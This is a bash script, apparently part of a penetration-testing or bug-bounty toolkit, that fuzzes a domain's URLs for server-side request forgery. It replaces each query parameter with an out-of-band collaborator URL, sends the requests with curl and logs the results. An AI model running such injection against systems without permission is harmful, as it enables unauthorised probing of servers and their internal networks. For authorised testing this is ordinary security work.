#!/usr/bin/env bash
TARGET="${1:-}"
OUTDIR="${2:-recon/$TARGET}"
COLLAB="${3:-}"

if [[ -z "$TARGET" ]]; then
  echo "Usage: $0 <domain> <recon_dir> [collaborator_url]"
  exit 1
fi

RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'
BLU='\033[0;34m'; RST='\033[0m'

info() { echo -e "[$(date '+%H:%M:%S')] ${BLU}[SSRF]${RST}  $*"; }
ok()   { echo -e "[$(date '+%H:%M:%S')] ${GRN}[OK]${RST}    $*"; }
warn() { echo -e "[$(date '+%H:%M:%S')] ${YLW}[WARN]${RST}  $*"; }
crit() { echo -e "[$(date '+%H:%M:%S')] ${RED}[HIT]${RST}   $*"; }

info "=== SSRF FUZZER ==="

# Ask for collaborator URL if not provided
if [[ -z "$COLLAB" ]]; then
  echo ""
  echo "  Open https://app.interactsh.com OR use Burp Collaborator"
  echo "  Copy your OOB URL (e.g. abc123.oast.fun)"
  echo -n "  Paste URL: "
  read -r COLLAB
  [[ "$COLLAB" != http* ]] && COLLAB="http://$COLLAB"
fi

FINDINGS="$OUTDIR/ssrf_fuzzer_findings.txt"
touch "$FINDINGS"
COUNT=0
HITS=0

info "Testing SSRF candidates..."
while read -r url; do
  params=$(echo "$url" | grep -oP '(?<=\?).*' | tr '&' '\n' | cut -d= -f1)
  [[ -z "$params" ]] && continue

  for param in $params; do
    test_url=$(echo "$url" | sed "s|\($param=\)[^&]*|\1$COLLAB|")
    status=$(curl -sk "$test_url" --max-time 8 \
      -H "User-Agent: Mozilla/5.0" \
      -o /dev/null -w "%{http_code}" 2>/dev/null || echo "000")

    echo "  [$status] $param → $test_url"
    echo "TESTED: $test_url [param=$param status=$status]" >> "$FINDINGS"
    COUNT=$((COUNT + 1))
  done

done < <(grep "?" "$OUTDIR/ssrf-candidates.txt" 2>/dev/null | head -50)

echo ""
info "SSRF Fuzzer complete"
info "Tested    : $COUNT parameters"
info "Collab    : $COLLAB"
info "Check     : https://app.interactsh.com for DNS/HTTP hits"
info "Results   : $FINDINGS"
